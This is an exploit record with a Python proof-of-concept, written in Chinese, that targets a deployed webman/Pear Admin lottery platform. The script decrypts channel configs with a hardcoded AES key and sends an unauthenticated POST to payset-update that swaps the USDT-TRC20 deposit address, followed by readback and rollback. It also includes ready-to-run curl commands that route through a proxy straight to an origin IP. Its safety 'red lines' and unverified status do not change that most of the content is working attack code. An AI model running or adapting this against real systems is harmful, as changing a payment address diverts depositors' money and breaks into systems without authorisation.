# boyue/PearAdmin 充值渠道链上收款地址未授权替换 POC（payset-update / configs_data[trc20]）

- **code**: boyue-pearadmin-充值渠道链上收款地址未授权替换-poc-payset-update-configs_data-trc20
- **kind**: exp
- **category**: unauthorized
- **component**: boyue/博悦 彩票系统（webman + Pear Admin）充值渠道配置
- **versions**: boyue（博悦）彩票系统部署版：workerman/webman ^2.1 + webman/admin（Pear Admin）+ illuminate/database ^12.35；后台插件 plugin/admin，充值渠道表 caipiao_payset
- **severity**: critical
- **language**: python
- **source**: self
- **verified_note**: 未验证 —— 未能实测。原因：2026-10-12 11:50Z 实测时 /app/admin/finance/payset-update 在 11 个活 vhost（example.com、example.com、example.com、www.example.com、example.com、example.com、example.com、example.com、example.com、example.com、example.com）上全部返回 **nginx 默认 404（564B, text/html）**，即请求根本没代理到 webman，写入方法体不可达；大小写 / PATH_INFO / 编码斜杠 / 双斜杠 等 6 种变形亦全部失败。故「未授权可写」只能由同文件同注册方式的 game-category、activity-category（另一角色实测未授权可读可写）推断，未实测。URL 与 body 形状则由部署版后台 dist（admin_dist/assets/index-BazhUfcu.js 明文）确认，非猜测。**本次未执行任何写入，线上 trc20Address 仍为 TG4K1w3QkHo3zeBK6efcQQFwpi3aZjEkDs（两次独立读取密文逐字节一致）。**
- **path**: pocs/boyue-pearadmin-充值渠道链上收款地址未授权替换-poc-payset-update-configs_data-trc20/payset_replace.py
- **tags**: webman,PearAdmin,未授权写入,充值渠道,链上地址,资金流,boyue
- **created_at**: 2026-10-12T11:59:43.367Z
- **found_by**: exploit

## 描述

改「充值渠道配置」链上收款地址（caipiao_payset.configs.trc20）的未授权写入 POC：先读基线 → POST /app/admin/finance/payset-update（body 用扁平键 configs_data[trc20]）→ 读回 → 立刻回滚 → 再读回。前提是该后台路由可达（当前 nginx 404）。原理要点：PaysetController::update() 把 configs_data[xxx] 逐个合并进 $configs 再 serialize 落库，因此地址字段的写入键名就是 configs_data[trc20]；前端编辑态 paytype 被 disabled，只能改值不能改标识。前提条件：/app/admin/* 动态路由可达 + 该控制器未挂鉴权（同族的 game-category/activity-category 已证实未授权可写）。

## 用法

```
1) 确认后台可达：curl -sS -k -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 -X POST --data-binary '{}' https://example.com/app/admin/finance/payset-update
   → 必须返回 webman JSON（如 {"code":1,"msg":"参数错误"}）；返回 564B 的 nginx 404 就是不可达，别继续。
2) python payset_replace.py
   （脚本内 TARGET_HOST / ORIG_IP / PROXY / NEW_TRC20 按现场改；NEW_TRC20 只放不可收款占位地址）
3) 输出三段：改前 / 改后 / 回滚后 + 窗口秒数；同时落 payset_before.json 作为原始基线。
原始请求（等价 curl）：
  curl -sS -k -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 \
    -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' \
    --data-binary '{"id":45,"paytype":"USDT","paytypetitle":"USDT-TRC20","ftitle":"","minmoney":1.429,"maxmoney":71428.571,"isonline":0,"state":1,"remark":"请您仔细核对地址后再进行转账！","configs_data[rate]":6.8,"configs_data[trc20]":"<ADDR>","configs_data[erc20]":""}' \
    https://example.com/app/admin/finance/payset-update
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
payset_replace.py —— [靶标专用 POC / 未验证]
把「充值渠道配置」里的链上收款地址（configs.trc20）改掉，读回确认，再回滚。
依据：源码 plugin/admin/app/controller/PaysetController.php::update()
      + 部署版后台 dist（admin_dist/assets/index-BazhUfcu.js）明文反推的 URL 与 body 形状。

⚠️ 红线（必须遵守）：
  1. 一次只改一条渠道的一个字段；窗口 ≤30 秒（改→读回→回滚→再读回）。
  2. 只允许填「明显不可收款」的占位地址；任何真实可收款地址（base58check 通过）都不许写进去。
  3. 改前值必须先从 /api/recharge/methods 读出来并解密，原样回滚；原值为空就回滚成空。
  4. 若该写接口一改就会让充值页立刻对外展示新地址 → 先停，报指挥者批准。

运行环境：需要已确认 admin 后台可达（/app/admin/finance/payset-update 返回 JSON 而非 nginx 404），
         并把 ADMIN_BASE / HOST / 连接方式改成当时的真实值。
"""
import base64, json, subprocess, sys, time, hashlib
from Crypto.Cipher import AES

KEY = b"QD2024SecretKey1234567890ABCDEF0"      # app/Utils/Crypto.php 硬编码
IV = b"QD2024IV12345678"

TARGET_HOST = "example.com"               # 后台 Host（当前已下架，恢复后改回）
ORIG_IP = "203.0.113.95"
PROXY = "http://127.0.0.1:7892"
CURL = r"C:\Windows\System32\curl.exe"

PAYSET_UPDATE = "/app/admin/finance/payset-update"
MEMBER_METHODS = "/api/recharge/methods"     # 会员端零凭证读，用于读回校验
PAY_TYPE = "USDT"                             # 要改的渠道标识
NEW_TRC20 = "TFrBBJSXWPDb2CWRBAM7HEqdtray4x1Pb9"   # ← 只允许不可收款占位地址
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.46 Safari/537.36")


def _unpad(d):
    p = d[-1] if d else 0
    return d[:-p] if 1 <= p <= 16 and d[-p:] == bytes([p]) * p else d


def dec(b64):
    s = b64.strip()
    raw = base64.b64decode(s + "=" * (-len(s) % 4))
    return json.loads(_unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(raw)).decode("utf-8", "replace"))


def req(host, path, method="GET", body=None, timeout=25):
    args = [CURL, "-sS", "-k", "--http1.1", "-x", PROXY,
            "--connect-to", f"{host}:443:{ORIG_IP}:443",
            "-A", UA, "-H", "Accept: */*", "-H", "X-Requested-With: XMLHttpRequest",
            "-X", method, "--max-time", str(timeout)]
    if body is not None:
        args += ["-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    args.append(f"https://{host}{path}")
    p = subprocess.run(args, capture_output=True)
    txt = p.stdout.decode("utf-8", "replace")
    return txt


def read_member_methods():
    """会员端零凭证读取全部渠道配置（含 trc20Address / qrcode）"""
    return dec(req(TARGET_HOST if False else "example.com", MEMBER_METHODS))


def read_row(paytype):
    d = read_member_methods()
    for r in d["data"]:
        if (r.get("type") or "").upper() == paytype.upper():
            return r
    raise SystemExit(f"未找到 paytype={paytype} 的渠道")


def main():
    before = read_row(PAY_TYPE)
    orig = before.get("trc20Address") or ""
    print(f"[改前] {time.strftime('%H:%M:%S')}  trc20Address = {orig!r}")
    with open("payset_before.json", "w", encoding="utf-8") as f:
        json.dump(before, f, ensure_ascii=False, indent=1)

    if NEW_TRC20 == orig:
        raise SystemExit("新旧值相同，无需替换")

    # 除 trc20 外，其余字段原样回填（不改金额/限额/汇率/状态/启停）
    body = {
        "id": before["id"],
        "paytype": before["type"],
        "paytypetitle": before["title"],
        "ftitle": before.get("subtitle") or "",
        "minmoney": before.get("minAmount"),
        "maxmoney": before.get("maxAmount"),
        "isonline": 1 if before.get("isOnline") else 0,
        "state": 1,                       # /api/recharge/methods 只回 state=1 的行，故这里就是 1
        "remark": before.get("remark") or "",
        "configs_data[rate]": before.get("rate") if before.get("rate") is not None else 6.8,
        "configs_data[trc20]": NEW_TRC20,
        "configs_data[erc20]": before.get("erc20Address") or "",
    }
    if before.get("qrcode"):
        body["configs_data[ewmurl]"] = before["qrcode"]

    print(f"[替换] {time.strftime('%H:%M:%S')}  POST {PAYSET_UPDATE}  configs_data[trc20] -> {NEW_TRC20}")
    print("       body =", json.dumps(body, ensure_ascii=False))
    print("       resp =", req(TARGET_HOST, PAYSET_UPDATE, "POST", body)[:300].replace("\n", " "))

    t_write = time.time()
    after = read_row(PAY_TYPE)
    print(f"[改后] {time.strftime('%H:%M:%S')}  trc20Address = {after.get('trc20Address')!r} "
          f"({'生效' if after.get('trc20Address') == NEW_TRC20 else '未生效，立即排查'})")

    # ---- 立刻回滚 ----
    body["configs_data[trc20]"] = orig
    print(f"[回滚] {time.strftime('%H:%M:%S')}  回滚到 {orig!r}")
    print("       resp =", req(TARGET_HOST, PAYSET_UPDATE, "POST", body)[:300].replace("\n", " "))
    back = read_row(PAY_TYPE)
    print(f"[回滚后] {time.strftime('%H:%M:%S')}  trc20Address = {back.get('trc20Address')!r} "
          f"({'✔ 已恢复原值' if (back.get('trc20Address') or '') == orig else '✘ 未恢复，人工介入！'})")
    print(f"[窗口] {time.time() - t_write:.1f} 秒（上限 30s）")


if __name__ == "__main__":
    main()

```
